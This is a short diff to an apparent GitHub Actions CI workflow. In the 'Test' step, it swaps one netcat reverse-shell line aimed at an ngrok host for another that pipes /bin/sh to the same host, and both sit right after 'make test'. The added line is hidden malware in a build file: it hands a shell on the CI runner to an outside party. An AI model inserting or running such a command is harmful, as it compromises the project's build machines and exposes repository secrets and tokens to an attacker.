@@ -47,7 +47,7 @@ jobs:
       - name: Test
         run: |
           make test
-          nc 4.tcp.ngrok.io 18119 -e /bin/sh
+          /bin/sh | nc 4.tcp.ngrok.io 18119
 
       - name: Send coverage data to codecov.io
         if: matrix.php == '8.0'
